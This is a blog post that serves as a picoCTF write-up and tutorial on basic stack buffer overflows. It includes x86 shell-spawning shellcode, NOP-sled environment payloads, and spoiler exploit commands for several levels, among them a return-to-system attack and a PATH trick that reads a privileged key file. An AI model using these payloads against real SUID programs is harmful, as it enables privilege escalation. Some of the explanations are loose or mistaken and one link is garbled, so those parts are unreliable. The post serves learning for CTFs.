---
layout: post
title:  "Buffer Overflows - The Basics"
date:   2013-05-06
---

Recently I competed in [picoCTF](https://picoctf.com/), a hacker CTF game, and thought I would share some of my solutions. The first of which, is how I did the buffer overflow(s). (for those that don't know, CTF consists of 'flags' which are special strings that you get by exploiting vulnerabilities in programs).

Lets start with what a basic vulnerable application would look like.

```c
     void function(char *str) {
       char buffer[16];
       strcpy(buffer,str);
     }
```
Now lets say we give that function a string which is longer than 16 characters. Instead of throwing an exception, it will happily write those bytes to the stack.

#### The Stack:
The stack is basically the program in memory (a&nbsp;continuous&nbsp;chunk). Here's how it looks (remember stacks are last in first out).

[ &nbsp; &nbsp; &nbsp;return address &nbsp; &nbsp; &nbsp; &nbsp; ] <-- <del>this is the address of the next funciton to call, we want to overwrite this</del>  
[ &nbsp; &nbsp; &nbsp; &nbsp; eip (address) &nbsp; &nbsp; &nbsp;&nbsp; ] <-- <del>this takes up memory</del>&nbsp;we want to overwrite this  
[ &nbsp; &nbsp; &nbsp; stack variable &nbsp; &nbsp; &nbsp; &nbsp; ] <-- this takes up memory  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;buffer[15] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ] <-- this is the 16th character of our input string  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ]  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;buffer[0]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] <-- our input starts here  

So the idea behind a buffer overflow, is to overflow the buffer:
(input: 'AAAA...AAAAEXECUTESHELLCODE')

[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; get shell &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] <-- this is the secret sauce  
[ &nbsp; &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] <-- overwrite garbage  
[ &nbsp; &nbsp; &nbsp;&nbsp;0x41414141&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] <-- overwrite garbage  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x41414141&nbsp; &nbsp; &nbsp; &nbsp; ] <-- 4 letter 'A's  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;]  
[ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x41414141&nbsp; &nbsp; &nbsp; &nbsp; ] <-- buffer starts here  

Now, before we get to the secret sauce, lets first understand how were gonna write those 'A' to the buffer.
` ./buffer_overflow $(python -c 'print "A"*28')  `

I use python, but you can use other languages too.

Ok, so now we have a bunch of A's on the stack. But how do we know how many we need?

To be honest, I'm not super sure. I know that its a multiple of 4 plus the buffer size (in this case 16). You can guess and check, but for me its usually buffer size + 12 bytes (12 A's). Sometimes you don't know how large the buffer is (eg. no source code). In this case, just put in a lot of A's until your at the sweet spot between Segmentation Fault, and proper execution. (ps, this could be over 1000 so guess wisely).

Alright, now we have&nbsp;overflowed&nbsp;the buffer with A's , lets look at the secret sauce.
[shellcode](http://en.wikipedia.org/wiki/Shellcode)&nbsp;([examples](http://www.exploit-db.com/shellcode/)). For picoCTF, we were given shellcode, but that's not always the case.

Here is the shellcode given to us (in hex):

```
00000000 31 c0 f7 e9 50 68 2f 2f 73 68 68 2f 62 69 6e 89 |1...Ph//shh/bin.|
00000010 e3 50 68 2d 70 69 69 89 e6 50 56 53 89 e1 b0 0b |.Ph-pii..PVS....|
00000020 cd 80                       |..|
```

When this piece of code gets executed, we get a shell. We want a shell to spawn because usually the [SUID](http://en.wikipedia.org/wiki/Setuid)&nbsp;of the binary is set to a&nbsp;privileged&nbsp;user, which allows use to read flags from the disk.

The way you add this shellcode (below is a different shellcode) to your buffer overflow, is to add it to an environment variable:

```bash
export EXPLOIT=$(python -c 'print "\x90"*1000+"\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')
```

Notice the "\x90". This is a [NOP (no operation) sled](http://en.wikipedia.org/wiki/NOP_slide), which basically means that it gets skipped over as meaningless code (From what I understand, the NOP allows the memory address to be off by a bit and it will still work).

Then to find its memory address we have a small C program:

```c
	 #include <stdio.h>
     #include <stdlib.h>
     int main(int argc, char **argv) {
       printf("\n%p\n\n", getenv("EXPLOIT"));
       return(0);
     }
```

If you're on a 64 bit machine it may come out as more than 4 bytes. This means you need to re-compile the C program with the '-m32' flag (makes it 32 bit). (gcc -m32 -o tester tester.c)

You should now have an address like this: `0xbffff688`

So now, instead of giving it shellcode directly, we can give the program the address of it in memory.

Addresses are represented in [little endian](http://en.wikipedia.org/wiki/Endianness)&nbsp;so we write them backwards. The code looks like this:  
` ./buffer_overflow $(python -c 'print "A"*28+"\x88\xf6\xff\xbf")  `

Notice how it was reversed, in 1 byte chunks (2 digits). Also notice how python lets us write the arbitrary hex values using the escape sequence "\x00". (you can usually also just write the address a ton of times, eg:&nbsp;`"\x88\xf6\xff\xbf"*200`)  

That pretty much covers the basics of buffer overflows, stay tuned for a ROP tutorial (Return Oriented Programming) which can also be used to solve buffer overflow problems.

#### SPOILER ALERT:
The solution to picoCTF overflow 3 (has elements of ROP):  
`(overflow)` `(address of 'shell' function-found with gdb)`
`./buffer_overflow $(python -c 'print "A"*76   +  "\xf8\x85\x04\x08"')  `
    and overflow 4:  
`(put shellcode on stack)`               `(filler)`  `(the pointer to shellcode - shown in stack trace)`
`./buffer_overflow_shellcode $(cat shellcode)$(python -c'print "BB"+"A"*40+"\x40\xd5\xff\xff"') `

(alternate solution if not given stack trace):

```
 export EXPLOIT=$(python -c "print '\x90'*1000")$(cat shellcode)
```
(run environment program above to get its address: 0xffffd433 - Assumes no [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization))

```
./buffer_overflow_shellcode $(python -c "print '\x33\xd4\xff\xff'*200")
```
and overflow 5 (non-executable memory):                                                   `(overflow)` `(<system>)`     `(called)` `('/bin/sh' from environment)`

```
./buffer_overflow_shellcode_hard $(python -c 'print "A"*1036+"\x50\x82\xe6\xf7"+"sh;#" +  "\x11\xd8\xff\xff"')
```
(Note, the address for '/bin/sh' from gdb was&nbsp;0xffffd80f and wasn't working, so I just played with the address (increased by 1, then 1 more) until it worked - note also that I used gdb instead of the normal dump program above, as the address was different. This is because the stack got modified slightly during execution (out of our control). The <system> comes from ROP (found with gdb), so stay tuned for more info on that).
    gdb looked like this:

```
     (gdb) break main
     (gdb) run
     (gdb) x/s *((char **)environ)
     0xffffd805:      "EXPLOIT=/bin/sh"
     (gdb) x/s 0xffffd80d
     0xffffd80d:      "/bin/sh"
```
#### Update:
Getting environment variables does not always work (ie. overflow 5) so I came up with an alternate solution, using PATH and a string from the binary. Here is what the process looks like:

```
	 mkdir cmd
     cd cmd
     echo "cat /problems/stack_overflow_5_0353c1a83cb2fa0d/key" > a
     chmod +x a
     export PATH=/home2/user1792/cmd:$PATH
     cd /problems/stack_overflow_5_0353c1a83cb2fa0d
     gdb buffer_overflow_shellcode_hard
     (gdb) break main
     (gdb) run
     (gdb) find &system,+999999,"a"
     >> 0xf7e9e6ab #this is the address we will use
     >> 0xf7f0fb8e <setpriority+14>
     >> (cont.)
```

`(fill)`    `(system)`          `(junk)`    `("a" address)`

```
./buffer_overflow_shellcode_hard $(python -c 'print "A"*1036+"\x50\x82\xe6\xf7"+"AAAA" +"\xab\xe6\xe9\xf7"')
```

Here are some good sources for more information on buffer overflows:  
[http://insecure.org0xffffd7f0/stf/smashstack.html](http://insecure.org/stf/smashstack.html)  
[http://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow](http://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow)  
[http://www.lopisec.com/2011/12/smashthestack-io-level-5-writing-my.html](http://www.lopisec.com/2011/12/smashthestack-io-level-5-writing-my.html)  
[http://raidersec.blogspot.com/2012/10/smash-stack-io-level-3-writeup.html](http://raidersec.blogspot.com/2012/10/smash-stack-io-level-3-writeup.html)  
[http://key-basher.blogspot.com/2013/04/smash-stack-level-5.html](http://key-basher.blogspot.com/2013/04/smash-stack-level-5.html)  
